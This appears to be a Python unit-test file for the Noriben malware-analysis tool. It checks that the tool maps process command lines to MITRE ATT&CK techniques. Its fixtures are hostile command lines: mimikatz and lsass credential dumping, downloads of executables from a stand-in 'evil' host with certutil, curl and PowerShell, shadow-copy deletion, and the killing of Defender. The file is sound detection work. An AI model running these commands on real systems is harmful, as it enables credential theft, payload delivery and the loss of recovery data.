"""
Unit tests for the v3.0.1 broadened MITRE ATT&CK mapping: expanded technique
detection across tactics, the tactic field, and the by-tactic grouping.

Run with:  python -m unittest discover -s tests -v
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import Noriben  # noqa: E402


def _proc(cmdline, pid='1', child='2'):
    return '[CreateProcess] mal.exe:{} > {}\t[Child PID: {}]'.format(pid, cmdline, child)


def _techniques_for(cmdlines):
    ind = Noriben.analyze_indicators([_proc(c) for c in cmdlines], [], [], [], [], 'SHA256')
    return Noriben.detect_attack_techniques(ind)


def _ids(cmdlines):
    return {t['id'] for t in _techniques_for(cmdlines)}


class ExpandedDetectionTests(unittest.TestCase):
    def test_discovery(self):
        ids = _ids(['whoami', 'systeminfo', 'ipconfig /all', 'tasklist', 'net view',
                    'netstat -ano', 'reg query HKLM', 'nltest /domain_trusts'])
        for tid in ('T1033', 'T1082', 'T1016', 'T1057', 'T1087', 'T1049', 'T1012', 'T1482'):
            self.assertIn(tid, ids)

    def test_credential_access(self):
        ids = _ids(['reg save hklm\\sam sam.hiv', 'mimikatz sekurlsa::logonpasswords',
                    'rundll32 comsvcs.dll MiniDump 1 c:\\lsass.dmp full', 'vaultcmd /list'])
        for tid in ('T1003.002', 'T1003', 'T1003.001', 'T1555'):
            self.assertIn(tid, ids)

    def test_lateral_movement(self):
        ids = _ids(['psexec \\\\host -s cmd', 'mstsc /v:10.0.0.5',
                    'net use \\\\host\\admin$ /user:a b'])
        for tid in ('T1021.002', 'T1021.001'):
            self.assertIn(tid, ids)

    def test_impact(self):
        ids = _ids(['net stop wuauserv', 'shutdown /r /f /t 0', 'vssadmin delete shadows /all'])
        for tid in ('T1489', 'T1529', 'T1490'):
            self.assertIn(tid, ids)

    def test_c2_ingress(self):
        # each downloader must independently map to Ingress Tool Transfer
        self.assertIn('T1105', _ids(['certutil -urlcache -split -f http://evil/a.exe']))
        self.assertIn('T1105', _ids(['bitsadmin /transfer j http://evil/a.exe c:\\a.exe']))
        self.assertIn('T1105', _ids(['curl http://evil/a.exe -o a.exe']))
        self.assertIn('T1105', _ids(['powershell (New-Object Net.WebClient).DownloadFile("http://x","a")']))

    def test_account_creation_and_taskkill(self):
        self.assertIn('T1136.001', _ids(['net user hacker P@ss /add']))
        self.assertIn('T1562.001', _ids(['taskkill /f /im msmpeng.exe']))

    def test_collection_and_privesc(self):
        self.assertIn('T1560.001', _ids(['rar a -r out.rar c:\\docs']))
        self.assertIn('T1548.002', _ids(['fodhelper.exe']))

    def test_wmi_execution(self):
        self.assertIn('T1047', _ids(['wmic process call create "calc.exe"']))


class TacticFieldTests(unittest.TestCase):
    def test_every_technique_has_a_tactic(self):
        techniques = _techniques_for(['whoami', 'powershell -enc QQBBAEEAQQBCAGMA', 'psexec \\\\h'])
        for tech in techniques:
            self.assertIn('tactic', tech)
            self.assertTrue(tech['tactic'])

    def test_known_tactic_mapping(self):
        by_id = {t['id']: t for t in _techniques_for(['whoami', 'vssadmin delete shadows'])}
        self.assertEqual(by_id['T1033']['tactic'], 'Discovery')
        self.assertEqual(by_id['T1490']['tactic'], 'Impact')


class GroupByTacticTests(unittest.TestCase):
    def test_grouping_is_kill_chain_ordered(self):
        techniques = _techniques_for(['vssadmin delete shadows', 'whoami', 'powershell x'])
        grouped = Noriben.group_techniques_by_tactic(techniques)
        tactics = [g['tactic'] for g in grouped]
        # Execution must come before Discovery, which comes before Impact
        self.assertLess(tactics.index('Execution'), tactics.index('Discovery'))
        self.assertLess(tactics.index('Discovery'), tactics.index('Impact'))

    def test_matrix_section_text(self):
        techniques = _techniques_for(['whoami', 'vssadmin delete shadows'])
        blob = '\n'.join(Noriben.format_attack_matrix(techniques))
        self.assertIn('ATT&CK Coverage by Tactic:', blob)
        self.assertIn('[Discovery]', blob)
        self.assertIn('[Impact]', blob)
        self.assertIn('T1033', blob)

    def test_empty_matrix(self):
        self.assertEqual(Noriben.format_attack_matrix([]), [])


class JsonByTacticTests(unittest.TestCase):
    def test_json_includes_by_tactic(self):
        ind = Noriben.analyze_indicators([_proc('whoami')], [], [], [], [], 'SHA256')
        tech = Noriben.detect_attack_techniques(ind)
        data = Noriben.build_json_report(ind, tech, {'version': 'x'})
        self.assertTrue(data['attack_by_tactic'])
        self.assertEqual(data['attack_by_tactic'][0]['tactic'], 'Discovery')
        self.assertEqual(data['attack_by_tactic'][0]['techniques'][0]['id'], 'T1033')


class ScoringTacticTests(unittest.TestCase):
    def test_credential_dumping_raises_score(self):
        ind = Noriben.analyze_indicators([_proc('mimikatz sekurlsa::logonpasswords')],
                                         [], [], [], [], 'SHA256')
        verdict = Noriben.score_sample(ind, Noriben.detect_attack_techniques(ind))
        self.assertGreaterEqual(verdict['score'], 25)
        self.assertTrue(any('credential' in r.lower() for r in verdict['reasons']))

    def test_recon_only_is_low(self):
        ind = Noriben.analyze_indicators([_proc('whoami'), _proc('systeminfo')],
                                         [], [], [], [], 'SHA256')
        verdict = Noriben.score_sample(ind, Noriben.detect_attack_techniques(ind))
        # Pure recon should not by itself reach "Malicious"
        self.assertLess(verdict['score'], 60)


if __name__ == '__main__':
    unittest.main()
